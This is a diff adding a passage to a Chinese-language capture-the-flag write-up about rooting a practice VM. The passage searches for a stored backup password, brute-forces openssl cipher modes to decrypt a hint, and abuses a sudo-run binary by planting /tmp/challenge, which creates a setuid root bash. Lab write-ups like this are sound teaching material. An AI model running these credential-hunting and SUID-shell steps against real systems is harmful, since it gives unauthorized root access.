@@ -227,6 +227,173 @@ drwxr-xr-x 10 root root  4096 Aug 30  2019 wfuzz
 b2b17036da1de94cfb024540a8e7075a
 ```
 
+另一种提权方式，既然 enc 中需要输入密码，很可能靶机设计者将密码存储在机器上，尝试寻找看看有没有,过滤掉一些不正常的目录：
+
+```
+www-data@ubuntu:/home/saket$ find / -name '*backup*' 2>/dev/null | sort | grep -v "/usr/" | grep -v "/lib"
+
+/opt/backup
+/opt/backup/server_database/backup_pass
+/var/backups
+```
+
+发现了一个名为 /opt/backup/server_database/backup_pass 的文件：
+
+```
+your password for backup_database file enc is
+
+"backup_password"
+
+Enjoy!
+```
+
+得到了我们想要的密码 backup_password
+
+再次执行 sudo enc 后，在/home/saket 目录中得到了两个文件：enc.txt 和 key.txt :
+
+```
+www-data@ubuntu:/home/saket$ cat enc.txt
+nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
+
+www-data@ubuntu:/home/saket$ cat key.txt
+I know you are the fan of ippsec.
+
+So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
+```
+
+先将 ippsec 转化为 md5:
+
+```
+echo -n 'ippsec' | md5sum
+366a74cb3c959de17d61db30591c39d1
+```
+
+openssl 中有 enc 加解密，所以尝试用上面得到的 md5 值去解密那串字符串(enc.txt 中的内容，加密之后使用了 base64 进行了编码), 但是 enc.txt 中的字符串，不知道 enc 是使用的哪个类型的加密算法，需要进行遍历尝试：
+
+先查看下 enc 支持的算法：
+
+```
+openssl enc -list
+
+-aes-128-cbc               -aes-128-cfb               -aes-128-cfb1
+-aes-128-cfb8              -aes-128-ctr               -aes-128-ecb
+-aes-128-ofb               -aes-192-cbc               -aes-192-cfb
+-aes-192-cfb1              -aes-192-cfb8              -aes-192-ctr
+-aes-192-ecb               -aes-192-ofb               -aes-256-cbc
+-aes-256-cfb               -aes-256-cfb1              -aes-256-cfb8
+-aes-256-ctr               -aes-256-ecb               -aes-256-ofb
+-aes128                    -aes128-wrap               -aes192
+-aes192-wrap               -aes256                    -aes256-wrap
+-aria-128-cbc              -aria-128-cfb              -aria-128-cfb1
+-aria-128-cfb8             -aria-128-ctr              -aria-128-ecb
+-aria-128-ofb              -aria-192-cbc              -aria-192-cfb
+-aria-192-cfb1             -aria-192-cfb8             -aria-192-ctr
+-aria-192-ecb              -aria-192-ofb              -aria-256-cbc
+-aria-256-cfb              -aria-256-cfb1             -aria-256-cfb8
+-aria-256-ctr              -aria-256-ecb              -aria-256-ofb
+-aria128                   -aria192                   -aria256
+-bf                        -bf-cbc                    -bf-cfb
+-bf-ecb                    -bf-ofb                    -blowfish
+-camellia-128-cbc          -camellia-128-cfb          -camellia-128-cfb1
+-camellia-128-cfb8         -camellia-128-ctr          -camellia-128-ecb
+-camellia-128-ofb          -camellia-192-cbc          -camellia-192-cfb
+-camellia-192-cfb1         -camellia-192-cfb8         -camellia-192-ctr
+-camellia-192-ecb          -camellia-192-ofb          -camellia-256-cbc
+-camellia-256-cfb          -camellia-256-cfb1         -camellia-256-cfb8
+-camellia-256-ctr          -camellia-256-ecb          -camellia-256-ofb
+-camellia128               -camellia192               -camellia256
+-cast                      -cast-cbc                  -cast5-cbc
+-cast5-cfb                 -cast5-ecb                 -cast5-ofb
+-chacha20                  -des                       -des-cbc
+-des-cfb                   -des-cfb1                  -des-cfb8
+-des-ecb                   -des-ede                   -des-ede-cbc
+-des-ede-cfb               -des-ede-ecb               -des-ede-ofb
+-des-ede3                  -des-ede3-cbc              -des-ede3-cfb
+-des-ede3-cfb1             -des-ede3-cfb8             -des-ede3-ecb
+-des-ede3-ofb              -des-ofb                   -des3
+-des3-wrap                 -desx                      -desx-cbc
+-id-aes128-wrap            -id-aes128-wrap-pad        -id-aes192-wrap
+-id-aes192-wrap-pad        -id-aes256-wrap            -id-aes256-wrap-pad
+-id-smime-alg-CMS3DESwrap  -rc2                       -rc2-128
+-rc2-40                    -rc2-40-cbc                -rc2-64
+-rc2-64-cbc                -rc2-cbc                   -rc2-cfb
+-rc2-ecb                   -rc2-ofb                   -rc4
+-rc4-40                    -seed                      -seed-cbc
+-seed-cfb                  -seed-ecb                  -seed-ofb
+-sm4                       -sm4-cbc                   -sm4-cfb
+-sm4-ctr                   -sm4-ecb                   -sm4-ofb
+```
+
+将上面的内容保存在文件中 ciper.txt ，并且对文件进行处理，将每个加密算法显示在单独的一行中(去掉中间的空行)，这样方便后面进行循环求解：
+
+```
+cd Downdloads
+
+cat ciper.txt | sed "s/ /\n/g" | sed '/^$/d' > ciper.out
+```
+
+```
+echo 'nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=' > enc.txt
+
+创建循环验证脚本：
+
+-K 需要变换为passwd的hex格式(也可以使用 tr -d '\n')
+
+echo -n `echo -n 'ippsec' | md5sum | awk -F ' ' {'print $1'}` | xxd -p -c 200
+3336366137346362336339353964653137643631646233303539316333396431
+
+for ciper in $(cat ciper.out); do
+    echo $ciper
+    openssl enc -d -a $ciper -K 3336366137346362336339353964653137643631646233303539316333396431 -in enc.txt 2>/dev/null
+done
+```
+
+得到了一个正确的显示：
+
+```
+-aes-256-ecb
+Dont worry saket one day we will reach to
+our destination very soon. And if you forget
+your username then use your old password
+==> "tribute_to_ippsec"
+```
+
+提示 saket 的密码是 tribute_to_ippsec ，su saket 看看他有什么权限，sudo -l 显示:
+
+```
+(root) NOPASSWD: /home/victor/undefeated_victor
+```
+
+继续执行这个 sudo 程序：
+
+```
+saket@ubuntu:~$ sudo /home/victor/undefeated_victor
+if you can defeat me then challenge me in front of you
+/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
+```
+
+/tmp/challenge 提示不存在，那我们就在/tmp 中创建一个这个文件，并写入相关的 bash 代码，看看会不会执行：
+
+```
+echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > /tmp/challenge && chmod +x /tmp/challenge
+
+sudo -u root /home/victor/undefeated_victor
+```
+
+执行成功：
+
+```
+saket@ubuntu:~$ ls -al /tmp/rootbash
+-rwsr-sr-x 1 root root 1037528 Jun  2 02:09 /tmp/rootbash
+
+saket@ubuntu:~$ /tmp/rootbash -p
+rootbash-4.3# id
+uid=1001(saket) gid=1001(saket) euid=0(root) egid=0(root) groups=0(root),1001(saket)
+rootbash-4.3# cd /root
+rootbash-4.3# ls
+enc  enc.cpp  enc.txt  key.txt	root.txt  sql.py  t.sh	wfuzz  wordpress.sql
+```
+
 同时在/root 中，看到了 enc 的源码：
 
 ```
@@ -244,5 +411,3 @@ system("/bin/cp /root/key.txt /home/saket/key.txt");
 return 0;
 }
 ```
-
-执行时需要输入的密码就是 backup_password，但是 enc.txt 和 key.txt 这 2 个 key 中的内容，不是 vitcim 和 root 的密码，没什么用。
